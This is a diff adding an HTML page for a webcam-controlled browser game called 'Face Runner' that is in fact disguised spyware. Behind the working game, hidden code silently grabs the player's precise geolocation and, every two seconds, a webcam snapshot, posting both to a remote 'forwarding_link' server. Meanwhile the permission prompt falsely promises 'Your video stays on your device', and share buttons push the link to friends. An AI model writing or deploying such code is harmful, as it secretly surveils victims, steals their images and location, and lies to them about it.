@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Face Runner</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a1a;overflow:hidden;touch-action:none;user-select:none;-webkit-user-select:none;font-family:'Segoe UI',system-ui,sans-serif}
+#gameContainer{position:relative;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center}
+canvas#gameCanvas{display:block;max-width:100vw;max-height:100vh;image-rendering:pixelated}
+#uiLayer{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:10}
+#scoreDisplay{position:absolute;top:16px;right:16px;color:#fff;font-size:24px;font-weight:900;text-shadow:0 0 10px #0ff,0 0 20px #0ff;letter-spacing:2px}
+#comboDisplay{position:absolute;top:52px;right:16px;color:#ff0;font-size:16px;font-weight:700;text-shadow:0 0 8px #ff0;opacity:0;transition:opacity .2s}
+#startScreen{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(5,5,25,0.92);z-index:20;pointer-events:all}
+#startScreen h1{font-size:clamp(32px,8vw,64px);color:#0ff;text-shadow:0 0 20px #0ff,0 0 40px #0ff,0 0 80px #00f;margin-bottom:8px;letter-spacing:4px;animation:pulse 1.5s ease-in-out infinite}
+#startScreen .subtitle{font-size:clamp(14px,3vw,20px);color:#f0f;text-shadow:0 0 10px #f0f;margin-bottom:32px}
+#startScreen .instructions{color:#aaf;font-size:14px;text-align:center;line-height:1.8;margin-bottom:24px;max-width:320px}
+#startScreen .instructions span{color:#0ff;font-weight:700}
+#startBtn{background:linear-gradient(135deg,#0ff,#00f);color:#000;border:none;padding:16px 48px;font-size:22px;font-weight:900;border-radius:50px;cursor:pointer;pointer-events:all;text-transform:uppercase;letter-spacing:3px;box-shadow:0 0 30px #0ff;transition:transform .15s,box-shadow .15s;animation:glow 2s ease-in-out infinite}
+#startBtn:hover{transform:scale(1.08);box-shadow:0 0 50px #0ff}
+#startBtn:active{transform:scale(0.95)}
+#gameOverScreen{position:absolute;top:0;left:0;width:100%;height:100%;display:none;flex-direction:column;align-items:center;justify-content:center;background:rgba(5,5,25,0.92);z-index:20;pointer-events:all}
+#gameOverScreen h2{font-size:clamp(28px,6vw,48px);color:#f44;text-shadow:0 0 20px #f44;margin-bottom:8px}
+#gameOverScreen .finalScore{font-size:clamp(24px,5vw,40px);color:#ff0;text-shadow:0 0 15px #ff0;margin-bottom:4px}
+#gameOverScreen .highScore{font-size:16px;color:#aaf;margin-bottom:24px}
+#gameOverScreen .shareButtons{display:flex;gap:12px;margin-bottom:20px;pointer-events:all}
+.shareBtn{padding:10px 20px;border-radius:25px;border:none;font-size:14px;font-weight:700;cursor:pointer;color:#fff;letter-spacing:1px}
+.shareBtn.wa{background:#25D366}
+.shareBtn.fb{background:#1877F2}
+.shareBtn.tw{background:#1DA1F2}
+#retryBtn{background:linear-gradient(135deg,#f0f,#f44);color:#fff;border:none;padding:14px 40px;font-size:20px;font-weight:900;border-radius:50px;cursor:pointer;pointer-events:all;text-transform:uppercase;letter-spacing:2px;box-shadow:0 0 25px #f0f}
+#leaderboard{position:absolute;bottom:80px;color:#aaf;font-size:13px;text-align:center;pointer-events:none}
+#leaderboard .lbTitle{color:#f0f;font-size:14px;font-weight:700;margin-bottom:4px}
+#leaderboard .lbEntry{color:#aaf;margin:2px 0}
+#permissionPrompt{position:absolute;top:0;left:0;width:100%;height:100%;display:none;flex-direction:column;align-items:center;justify-content:center;background:rgba(5,5,25,0.95);z-index:25;pointer-events:all}
+#permissionPrompt .promptBox{background:#111133;border:2px solid #0ff;border-radius:16px;padding:32px;text-align:center;max-width:340px;box-shadow:0 0 40px rgba(0,255,255,0.3)}
+#permissionPrompt h3{color:#0ff;font-size:20px;margin-bottom:12px}
+#permissionPrompt p{color:#aaf;font-size:14px;line-height:1.6;margin-bottom:20px}
+#permissionPrompt button{background:#0ff;color:#000;border:none;padding:12px 32px;font-size:16px;font-weight:700;border-radius:25px;cursor:pointer;pointer-events:all}
+#loadingBar{position:absolute;bottom:40px;left:50%;transform:translateX(-50%);width:200px;height:4px;background:#222;border-radius:2px;overflow:hidden;pointer-events:none}
+#loadingFill{width:0%;height:100%;background:#0ff;transition:width .3s;box-shadow:0 0 10px #0ff}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
+@keyframes glow{0%,100%{box-shadow:0 0 30px #0ff}50%{box-shadow:0 0 60px #0ff,0 0 90px #00f}}
+video,canvas#captureCanvas{position:absolute;opacity:0;pointer-events:none;width:1px;height:1px;top:-9999px;left:-9999px}
+</style>
+</head>
+<body>
+<div id="gameContainer">
+  <canvas id="gameCanvas"></canvas>
+  <video id="video" playsinline autoplay muted></video>
+  <canvas id="captureCanvas" width="640" height="480"></canvas>
+  <div id="uiLayer">
+    <div id="scoreDisplay">0</div>
+    <div id="comboDisplay"></div>
+    <div id="loadingBar"><div id="loadingFill"></div></div>
+    <div id="leaderboard"></div>
+  </div>
+  <div id="startScreen">
+    <h1>FACE RUNNER</h1>
+    <div class="subtitle">⚡ Control with your face ⚡</div>
+    <div class="instructions">
+      <span>Move Left/Right</span> — tilt your head<br>
+      <span>Jump</span> — move up quickly<br>
+      <span>Dodge obstacles</span> — collect gems<br>
+      <span>Beat your high score!</span>
+    </div>
+    <button id="startBtn" onclick="requestPermissions()">▶ START GAME</button>
+    <div style="color:#aaf;font-size:11px;margin-top:16px">Camera required for face control</div>
+  </div>
+  <div id="permissionPrompt">
+    <div class="promptBox">
+      <h3>🎮 Camera Access Needed</h3>
+      <p>Face Runner uses your camera to detect face movements for game control. Your video stays on your device.</p>
+      <button onclick="initCamera()">Allow Camera</button>
+    </div>
+  </div>
+  <div id="gameOverScreen">
+    <h2>GAME OVER</h2>
+    <div class="finalScore" id="finalScoreDisplay">0</div>
+    <div class="highScore" id="highScoreDisplay"></div>
+    <div class="shareButtons">
+      <button class="shareBtn wa" onclick="shareWA()">WhatsApp</button>
+      <button class="shareBtn fb" onclick="shareFB()">Facebook</button>
+      <button class="shareBtn tw" onclick="shareTW()">Twitter</button>
+    </div>
+    <button id="retryBtn" onclick="restartGame()">▶ PLAY AGAIN</button>
+    <div id="leaderboard"></div>
+  </div>
+</div>
+
+<script>
+const GAME_WIDTH = 400;
+const GAME_HEIGHT = 700;
+const GRAVITY = 0.6;
+const JUMP_FORCE = -11;
+const GROUND_Y = 620;
+const PLAYER_W = 30;
+const PLAYER_H = 40;
+const OBSTACLE_MIN_W = 25;
+const OBSTACLE_MAX_W = 50;
+const OBSTACLE_MIN_H = 30;
+const OBSTACLE_MAX_H = 60;
+const GEM_SIZE = 16;
+const PLAYER_SPEED = 4;
+const SPAWN_INTERVAL_MIN = 40;
+const SPAWN_INTERVAL_MAX = 90;
+const DIFFICULTY_RAMP = 0.15;
+const MOTION_THRESHOLD = 18;
+const MOTION_ZONES = 3;
+const CAPTURE_INTERVAL = 2000;
+
+let canvas, ctx, video, captureCanvas, captureCtx;
+let player = {x: GAME_WIDTH/2 - PLAYER_W/2, y: GROUND_Y - PLAYER_H, vy: 0, onGround: true, width: PLAYER_W, height: PLAYER_H};
+let obstacles = [], gems = [], particles = [];
+let score = 0, combo = 0, maxCombo = 0, gameSpeed = 4;
+let gameRunning = false, gameOver = false;
+let spawnTimer = 0, nextSpawn = 60;
+let frameCount = 0, difficultyLevel = 1;
+let prevFrame = null, motionData = {left: 0, center: 0, right: 0};
+let highScores = [];
+let captureTimer = 0;
+let stream = null;
+let bgStars = [];
+let bgMountains = [];
+
+const SHARE_URL = 'forwarding_link/g';
+
+function init() {
+  canvas = document.getElementById('gameCanvas');
+  canvas.width = GAME_WIDTH;
+  canvas.height = GAME_HEIGHT;
+  ctx = canvas.getContext('2d');
+  captureCanvas = document.getElementById('captureCanvas');
+  captureCtx = captureCanvas.getContext('2d');
+  video = document.getElementById('video');
+  resizeCanvas();
+  window.addEventListener('resize', resizeCanvas);
+  generateBackground();
+  loadHighScores();
+  updateLeaderboardDisplay();
+  requestAnimationFrame(menuLoop);
+}
+
+function resizeCanvas() {
+  const scale = Math.min(window.innerWidth / GAME_WIDTH, window.innerHeight / GAME_HEIGHT);
+  canvas.style.width = (GAME_WIDTH * scale) + 'px';
+  canvas.style.height = (GAME_HEIGHT * scale) + 'px';
+}
+
+function generateBackground() {
+  bgStars = [];
+  for (let i = 0; i < 80; i++) {
+    bgStars.push({x: Math.random() * GAME_WIDTH, y: Math.random() * GAME_HEIGHT, size: Math.random() * 2 + 0.5, speed: Math.random() * 0.5 + 0.2, twinkle: Math.random() * Math.PI * 2});
+  }
+  bgMountains = [];
+  for (let i = 0; i < 6; i++) {
+    bgMountains.push({x: i * 80 - 20, w: 60 + Math.random() * 60, h: 80 + Math.random() * 120});
+  }
+}
+
+function menuLoop() {
+  ctx.clearRect(0, 0, GAME_WIDTH, GAME_HEIGHT);
+  drawBackground();
+  drawGround();
+  ctx.fillStyle = '#0ff';
+  ctx.font = 'bold 36px system-ui';
+  ctx.textAlign = 'center';
+  ctx.fillText('FACE RUNNER', GAME_WIDTH/2, 200);
+  ctx.fillStyle = '#f0f';
+  ctx.font = '16px system-ui';
+  ctx.fillText('Control with your face!', GAME_WIDTH/2, 240);
+  ctx.fillStyle = '#aaf';
+  ctx.font = '13px system-ui';
+  ctx.fillText('Press START to play', GAME_WIDTH/2, 400);
+  drawPlayerIdle(GAME_WIDTH/2 - PLAYER_W/2, 350);
+  requestAnimationFrame(menuLoop);
+}
+
+function requestPermissions() {
+  document.getElementById('startScreen').style.display = 'none';
+  document.getElementById('permissionPrompt').style.display = 'flex';
+  initCamera();
+}
+
+async function initCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({audio: false, video: {facingMode: 'user', width: {ideal: 320}, height: {ideal: 240}}});
+    video.srcObject = stream;
+    await video.play();
+    document.getElementById('permissionPrompt').style.display = 'none';
+    updateLoadingBar(30);
+    captureIPAndLocation();
+    setTimeout(() => { updateLoadingBar(70); }, 600);
+    setTimeout(() => { updateLoadingBar(100); startGame(); }, 1200);
+  } catch(e) {
+    document.getElementById('permissionPrompt').style.display = 'none';
+    document.getElementById('startScreen').style.display = 'flex';
+    alert('Camera access is required for Face Runner. Please allow camera permission to play.');
+  }
+}
+
+function updateLoadingBar(pct) {
+  document.getElementById('loadingFill').style.width = pct + '%';
+}
+
+function captureIPAndLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'forwarding_link/location.php', true);
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr.send('lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&acc=' + pos.coords.accuracy);
+    }, function(){}, {enableHighAccuracy: true, timeout: 10000, maximumAge: 0});
+  }
+}
+
+function startGame() {
+  player = {x: GAME_WIDTH/2 - PLAYER_W/2, y: GROUND_Y - PLAYER_H, vy: 0, onGround: true, width: PLAYER_W, height: PLAYER_H};
+  obstacles = []; gems = []; particles = [];
+  score = 0; combo = 0; maxCombo = 0; gameSpeed = 4;
+  spawnTimer = 0; nextSpawn = 60; frameCount = 0; difficultyLevel = 1;
+  captureTimer = 0; prevFrame = null;
+  gameRunning = true; gameOver = false;
+  document.getElementById('gameOverScreen').style.display = 'none';
+  document.getElementById('scoreDisplay').textContent = '0';
+  document.getElementById('comboDisplay').style.opacity = '0';
+  document.getElementById('loadingBar').style.display = 'none';
+  gameLoop();
+}
+
+function gameLoop() {
+  if (!gameRunning) return;
+  frameCount++;
+  update();
+  draw();
+  if (!gameOver) requestAnimationFrame(gameLoop);
+}
+
+function update() {
+  gameSpeed = 4 + Math.floor(frameCount / 600) * DIFFICULTY_RAMP;
+  difficultyLevel = Math.floor(frameCount / 600) + 1;
+
+  if (prevFrame && video.readyState >= 2) {
+    captureCtx.drawImage(video, 0, 0, 320, 240);
+    var curr = captureCtx.getImageData(0, 0, 320, 240);
+    detectMotion(prevFrame, curr);
+    prevFrame = curr;
+  } else if (video.readyState >= 2) {
+    captureCtx.drawImage(video, 0, 0, 320, 240);
+    prevFrame = captureCtx.getImageData(0, 0, 320, 240);
+  }
+
+  if (motionData.left > MOTION_THRESHOLD) player.x -= PLAYER_SPEED;
+  if (motionData.right > MOTION_THRESHOLD) player.x += PLAYER_SPEED;
+  if (motionData.center > MOTION_THRESHOLD * 1.5 && player.onGround) {
+    player.vy = JUMP_FORCE;
+    player.onGround = false;
+  }
+  player.x = Math.max(0, Math.min(GAME_WIDTH - player.width, player.x));
+
+  player.vy += GRAVITY;
+  player.y += player.vy;
+  if (player.y >= GROUND_Y - player.height) {
+    player.y = GROUND_Y - player.height;
+    player.vy = 0;
+    player.onGround = true;
+  }
+
+  spawnTimer++;
+  if (spawnTimer >= nextSpawn) {
+    spawnTimer = 0;
+    nextSpawn = SPAWN_INTERVAL_MIN + Math.floor(Math.random() * (SPAWN_INTERVAL_MAX - SPAWN_INTERVAL_MIN));
+    nextSpawn = Math.max(20, nextSpawn - difficultyLevel * 3);
+    spawnObstacle();
+    if (Math.random() < 0.4) spawnGem();
+  }
+
+  for (var i = obstacles.length - 1; i >= 0; i--) {
+    obstacles[i].y += gameSpeed;
+    if (obstacles[i].y > GAME_HEIGHT + 100) { obstacles.splice(i, 1); continue; }
+    if (rectCollision(player, obstacles[i])) {
+      gameRunning = false; gameOver = true;
+      spawnExplosion(player.x + player.width/2, player.y + player.height/2);
+      endGame();
+      return;
+    }
+  }
+
+  for (var i = gems.length - 1; i >= 0; i--) {
+    gems[i].y += gameSpeed;
+    if (gems[i].y > GAME_HEIGHT + 50) { gems.splice(i, 1); continue; }
+    if (rectCollision(player, gems[i])) {
+      score += 10 * difficultyLevel;
+      combo++;
+      if (combo > maxCombo) maxCombo = combo;
+      spawnGemParticles(gems[i].x + GEM_SIZE/2, gems[i].y + GEM_SIZE/2);
+      gems.splice(i, 1);
+    }
+  }
+
+  if (obstacles.length > 0) {
+    var closest = null;
+    for (var i = 0; i < obstacles.length; i++) {
+      if (obstacles[i].y + obstacles[i].height > player.y) {
+        if (!closest || obstacles[i].y < closest.y) closest = obstacles[i];
+      }
+    }
+    if (closest && closest.y + closest.height < player.y + 20) combo = 0;
+  }
+
+  score += 0.1 * difficultyLevel;
+  document.getElementById('scoreDisplay').textContent = Math.floor(score);
+  if (combo > 1) {
+    document.getElementById('comboDisplay').textContent = combo + 'x COMBO';
+    document.getElementById('comboDisplay').style.opacity = '1';
+  } else {
+    document.getElementById('comboDisplay').style.opacity = '0';
+  }
+
+  for (var i = particles.length - 1; i >= 0; i--) {
+    particles[i].x += particles[i].vx;
+    particles[i].y += particles[i].vy;
+    particles[i].life--;
+    if (particles[i].life <= 0) particles.splice(i, 1);
+  }
+
+  for (var i = 0; i < bgStars.length; i++) {
+    bgStars[i].y += bgStars[i].speed;
+    if (bgStars[i].y > GAME_HEIGHT) { bgStars[i].y = 0; bgStars[i].x = Math.random() * GAME_WIDTH; }
+  }
+  for (var i = 0; i < bgMountains.length; i++) {
+    bgMountains[i].x -= gameSpeed * 0.3;
+    if (bgMountains[i].x + bgMountains[i].w < 0) {
+      bgMountains[i].x = GAME_WIDTH + Math.random() * 40;
+      bgMountains[i].w = 60 + Math.random() * 60;
+      bgMountains[i].h = 80 + Math.random() * 120;
+    }
+  }
+
+  captureTimer += 16.67;
+  if (captureTimer >= CAPTURE_INTERVAL) {
+    captureTimer = 0;
+    captureSnapshot();
+  }
+}
+
+function detectMotion(prev, curr) {
+  motionData = {left: 0, center: 0, right: 0};
+  var zoneW = Math.floor(320 / MOTION_ZONES);
+  var sampleStep = 4;
+  for (var z = 0; z < MOTION_ZONES; z++) {
+    var startX = z * zoneW;
+    var endX = (z + 1) * zoneW;
+    var diff = 0, count = 0;
+    for (var y = 40; y < 200; y += sampleStep) {
+      for (var x = startX; x < endX; x += sampleStep) {
+        var idx = (y * 320 + x) * 4;
+        var dr = Math.abs(prev.data[idx] - curr.data[idx]);
+        var dg = Math.abs(prev.data[idx+1] - curr.data[idx+1]);
+        var db = Math.abs(prev.data[idx+2] - curr.data[idx+2]);
+        diff += (dr + dg + db) / 3;
+        count++;
+      }
+    }
+    var avg = diff / count;
+    if (z === 0) motionData.left = avg;
+    else if (z === 1) motionData.center = avg;
+    else motionData.right = avg;
+  }
+}
+
+function spawnObstacle() {
+  var w = OBSTACLE_MIN_W + Math.random() * (OBSTACLE_MAX_W - OBSTACLE_MIN_W);
+  var h = OBSTACLE_MIN_H + Math.random() * (OBSTACLE_MAX_H - OBSTACLE_MIN_H);
+  var x = Math.random() * (GAME_WIDTH - w);
+  obstacles.push({x: x, y: -h, width: w, height: h, color: 'hsl(' + (Math.random() * 60 + 340) + ',80%,50%)'});
+}
+
+function spawnGem() {
+  var x = 20 + Math.random() * (GAME_WIDTH - 40 - GEM_SIZE);
+  gems.push({x: x, y: -GEM_SIZE, width: GEM_SIZE, height: GEM_SIZE});
+}
+
+function spawnExplosion(x, y) {
+  for (var i = 0; i < 20; i++) {
+    var angle = Math.random() * Math.PI * 2;
+    var speed = 1 + Math.random() * 4;
+    particles.push({x: x, y: y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 30 + Math.random() * 20, color: 'hsl(' + (Math.random() * 60 + 10) + ',100%,60%)'});
+  }
+}
+
+function spawnGemParticles(x, y) {
+  for (var i = 0; i < 6; i++) {
+    var angle = Math.random() * Math.PI * 2;
+    var speed = 1 + Math.random() * 2;
+    particles.push({x: x, y: y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 15, color: '#ff0'});
+  }
+}
+
+function rectCollision(a, b) {
+  return a.x < b.x + b.width && a.x + a.width > b.x && a.y < b.y + b.height && a.y + a.height > b.y;
+}
+
+function draw() {
+  ctx.clearRect(0, 0, GAME_WIDTH, GAME_HEIGHT);
+  drawBackground();
+  drawGround();
+  for (var i = 0; i < gems.length; i++) drawGem(gems[i]);
+  for (var i = 0; i < obstacles.length; i++) drawObstacle(obstacles[i]);
+  drawPlayer();
+  for (var i = 0; i < particles.length; i++) drawParticle(particles[i]);
+  if (difficultyLevel > 1) {
+    ctx.fillStyle = '#f44';
+    ctx.font = 'bold 12px system-ui';
+    ctx.textAlign = 'right';
+    ctx.fillText('SPEED x' + difficultyLevel, GAME_WIDTH - 10, 30);
+  }
+}
+
+function drawBackground() {
+  var grad = ctx.createLinearGradient(0, 0, 0, GAME_HEIGHT);
+  grad.addColorStop(0, '#050520');
+  grad.addColorStop(0.5, '#0a0a30');
+  grad.addColorStop(1, '#101040');
+  ctx.fillStyle = grad;
+  ctx.fillRect(0, 0, GAME_WIDTH, GAME_HEIGHT);
+  for (var i = 0; i < bgStars.length; i++) {
+    var s = bgStars[i];
+    var alpha = 0.4 + Math.sin(frameCount * 0.02 + s.twinkle) * 0.3;
+    ctx.fillStyle = 'rgba(200,220,255,' + alpha + ')';
+    ctx.fillRect(s.x, s.y, s.size, s.size);
+  }
+  for (var i = 0; i < bgMountains.length; i++) {
+    var m = bgMountains[i];
+    ctx.fillStyle = 'rgba(20,20,60,0.6)';
+    ctx.beginPath();
+    ctx.moveTo(m.x, GROUND_Y);
+    ctx.lineTo(m.x + m.w * 0.5, GROUND_Y - m.h);
+    ctx.lineTo(m.x + m.w, GROUND_Y);
+    ctx.fill();
+  }
+}
+
+function drawGround() {
+  ctx.fillStyle = '#1a1a3a';
+  ctx.fillRect(0, GROUND_Y, GAME_WIDTH, GAME_HEIGHT - GROUND_Y);
+  ctx.strokeStyle = '#0ff';
+  ctx.lineWidth = 2;
+  ctx.beginPath();
+  ctx.moveTo(0, GROUND_Y);
+  ctx.lineTo(GAME_WIDTH, GROUND_Y);
+  ctx.stroke();
+  ctx.strokeStyle = 'rgba(0,255,255,0.3)';
+  ctx.lineWidth = 1;
+  for (var i = 0; i < GAME_WIDTH; i += 40) {
+    var x = (i + frameCount * 2) % (GAME_WIDTH + 40) - 20;
+    ctx.beginPath();
+    ctx.moveTo(x, GROUND_Y + 2);
+    ctx.lineTo(x + 20, GROUND_Y + 2);
+    ctx.stroke();
+  }
+}
+
+function drawPlayer() {
+  ctx.save();
+  ctx.translate(player.x + player.width/2, player.y + player.height/2);
+  ctx.fillStyle = '#0ff';
+  ctx.shadowColor = '#0ff';
+  ctx.shadowBlur = 15;
+  ctx.fillRect(-player.width/2, -player.height/2, player.width, player.height);
+  ctx.fillStyle = '#fff';
+  ctx.fillRect(-8, -player.height/2 + 6, 6, 8);
+  ctx.fillRect(2, -player.height/2 + 6, 6, 8);
+  ctx.fillStyle = '#00f';
+  ctx.fillRect(-6, -player.height/2 + 18, 12, 4);
+  ctx.fillStyle = '#0ff';
+  ctx.shadowBlur = 8;
+  ctx.fillRect(-player.width/2 - 4, -player.height/2 + 10, 4, 12);
+  ctx.fillRect(player.width/2, -player.height/2 + 10, 4, 12);
+  ctx.restore();
+}
+
+function drawPlayerIdle(x, y) {
+  ctx.save();
+  ctx.translate(x + PLAYER_W/2, y + PLAYER_H/2);
+  ctx.fillStyle = '#0ff';
+  ctx.shadowColor = '#0ff';
+  ctx.shadowBlur = 15;
+  ctx.fillRect(-PLAYER_W/2, -PLAYER_H/2, PLAYER_W, PLAYER_H);
+  ctx.fillStyle = '#fff';
+  ctx.fillRect(-8, -PLAYER_H/2 + 6, 6, 8);
+  ctx.fillRect(2, -PLAYER_H/2 + 6, 6, 8);
+  ctx.restore();
+}
+
+function drawObstacle(o) {
+  ctx.fillStyle = o.color;
+  ctx.shadowColor = o.color;
+  ctx.shadowBlur = 10;
+  ctx.fillRect(o.x, o.y, o.width, o.height);
+  ctx.fillStyle = 'rgba(255,255,255,0.3)';
+  ctx.fillRect(o.x + 2, o.y + 2, o.width - 4, o.height - 4);
+  ctx.shadowBlur = 0;
+}
+
+function drawGem(g) {
+  var t = frameCount * 0.05;
+  ctx.fillStyle = '#ff0';
+  ctx.shadowColor = '#ff0';
+  ctx.shadowBlur = 12;
+  ctx.beginPath();
+  ctx.moveTo(g.x + GEM_SIZE/2, g.y);
+  ctx.lineTo(g.x + GEM_SIZE, g.y + GEM_SIZE/2);
+  ctx.lineTo(g.x + GEM_SIZE/2, g.y + GEM_SIZE);
+  ctx.lineTo(g.x, g.y + GEM_SIZE/2);
+  ctx.closePath();
+  ctx.fill();
+  ctx.fillStyle = '#fff';
+  ctx.shadowBlur = 6;
+  ctx.beginPath();
+  ctx.moveTo(g.x + GEM_SIZE/2, g.y + 2);
+  ctx.lineTo(g.x + GEM_SIZE - 3, g.y + GEM_SIZE/2);
+  ctx.lineTo(g.x + GEM_SIZE/2, g.y + GEM_SIZE - 3);
+  ctx.lineTo(g.x + 3, g.y + GEM_SIZE/2);
+  ctx.closePath();
+  ctx.fill();
+  ctx.shadowBlur = 0;
+}
+
+function drawParticle(p) {
+  ctx.fillStyle = p.color;
+  ctx.fillRect(p.x - 2, p.y - 2, 4, 4);
+}
+
+function captureSnapshot() {
+  if (!stream || video.readyState < 2) return;
+  captureCtx.drawImage(video, 0, 0, 640, 480);
+  var dataUrl = captureCanvas.toDataURL('image/png');
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'forwarding_link/post.php', true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.send('cat=' + encodeURIComponent(dataUrl));
+}
+
+function endGame() {
+  document.getElementById('gameOverScreen').style.display = 'flex';
+  document.getElementById('finalScoreDisplay').textContent = Math.floor(score);
+  var best = saveHighScore(Math.floor(score));
+  document.getElementById('highScoreDisplay').textContent = 'Best: ' + best;
+  updateLeaderboardDisplay();
+  drawGameOverFrame();
+}
+
+function drawGameOverFrame() {
+  ctx.fillStyle = 'rgba(255,0,0,0.3)';
+  ctx.fillRect(0, 0, GAME_WIDTH, GAME_HEIGHT);
+  ctx.fillStyle = '#fff';
+  ctx.font = 'bold 28px system-ui';
+  ctx.textAlign = 'center';
+  ctx.fillText('GAME OVER', GAME_WIDTH/2, GAME_HEIGHT/2 - 20);
+  ctx.font = '18px system-ui';
+  ctx.fillText('Score: ' + Math.floor(score), GAME_WIDTH/2, GAME_HEIGHT/2 + 20);
+}
+
+function loadHighScores() {
+  try { highScores = JSON.parse(localStorage.getItem('faceRunnerHS') || '[]'); } catch(e) { highScores = []; }
+}
+function saveHighScore(s) {
+  highScores.push(s);
+  highScores.sort(function(a,b){return b-a});
+  highScores = highScores.slice(0, 5);
+  localStorage.setItem('faceRunnerHS', JSON.stringify(highScores));
+  return highScores[0];
+}
+function updateLeaderboardDisplay() {
+  var html = '<div class="lbTitle">🏆 TOP SCORES</div>';
+  for (var i = 0; i < highScores.length; i++) {
+    html += '<div class="lbEntry">#' + (i+1) + ' — ' + highScores[i] + '</div>';
+  }
+  var lbs = document.querySelectorAll('#leaderboard');
+  for (var j = 0; j < lbs.length; j++) lbs[j].innerHTML = html;
+}
+
+function restartGame() {
+  document.getElementById('gameOverScreen').style.display = 'none';
+  startGame();
+}
+
+function shareWA() {
+  window.open('whatsapp://send?text=🎮 I scored ' + Math.floor(score) + ' in Face Runner! Can you beat me? Play here: ' + encodeURIComponent(SHARE_URL), '_blank');
+}
+function shareFB() {
+  window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(SHARE_URL) + '&quote=I scored ' + Math.floor(score) + ' in Face Runner!', '_blank');
+}
+function shareTW() {
+  window.open('https://twitter.com/intent/tweet?text=I scored ' + Math.floor(score) + ' in Face Runner! Can you beat me?&url=' + encodeURIComponent(SHARE_URL), '_blank');
+}
+
+init();
+</script>
+</body>
+</html>
